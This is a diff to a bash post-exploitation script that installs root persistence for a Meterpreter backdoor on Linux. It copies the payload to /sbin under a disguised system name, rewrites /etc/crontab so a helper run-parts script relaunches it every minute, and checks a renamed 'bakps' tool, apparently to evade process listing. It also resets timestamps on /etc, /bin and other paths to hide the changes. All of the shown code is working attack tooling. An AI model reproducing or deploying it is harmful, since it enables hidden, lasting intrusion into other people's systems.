@@ -185,7 +185,8 @@ PROFILE_FILE="bash_completion.sh"
 
 # Crontab meterpreter
 METERPRETER="/tmp/linux_$NORMAL_PORT"
-NEW_METERPRETER="/sbin/run-parts-hourly"
+NEW_METERPRETER="run-parts-hourly"
+NEW_METERPRETER_PATH="/sbin/$NEW_METERPRETER"
 CRONTAB="/etc/crontab"
 CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
 CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
@@ -193,7 +194,7 @@ CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
 CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
 RUNPARTS_SCRIPT="#!/usr/bin/env bash
 
-! grep -q \"run-parts-hourly\" <<< \"\$(ps aux)\" && $NEW_METERPRETER &"
+(which \"bakps\" &>/dev/null && ! grep -q \"$NEW_METERPRETER\" <<< \"\$(bakps aux)\" && $NEW_METERPRETER_PATH &) || (! grep -q \"$NEW_METERPRETER\" <<< \"\$(ps aux)\" && $NEW_METERPRETER_PATH &")
 
 # Web delivery meterpreter
 WEB_URI="systemd-clock"
@@ -393,8 +394,8 @@ if [ -f "$CRONTAB" ]; then
 		etc_timestamp=$(get_timestamp "/etc")
 		crontab_timestamp=$(get_timestamp "$CRONTAB")
 
-		if cp -f "$METERPRETER" "$NEW_METERPRETER" 2>/dev/null && chmod +x "$NEW_METERPRETER"; then
-			cecho info "Copied meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER'"
+		if cp -f "$METERPRETER" "$NEW_METERPRETER_PATH" 2>/dev/null && chmod +x "$NEW_METERPRETER_PATH"; then
+			cecho info "Copied meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER_PATH'"
 
 			if echo "$RUNPARTS_SCRIPT" > "$run_parts_path"; then
 				cecho info "Wrote helper run-parts script to '$run_parts_path'"
@@ -420,11 +421,11 @@ if [ -f "$CRONTAB" ]; then
 			set_timestamp $usr_bin_timestamp "/usr/bin"
 			set_timestamp $bin_timestamp "/bin"
 			set_timestamp $run_parts_timestamp "$run_parts_path"
-			set_timestamp $new_meterpreter_timestamp "$NEW_METERPRETER"
+			set_timestamp $new_meterpreter_timestamp "$NEW_METERPRETER_PATH"
 			set_timestamp $etc_timestamp "/etc"
 			set_timestamp $crontab_timestamp "$CRONTAB"
 		else
-			cecho error "Could not copy meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER', skipping"
+			cecho error "Could not copy meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER_PATH', skipping"
 		fi
 	fi
 else
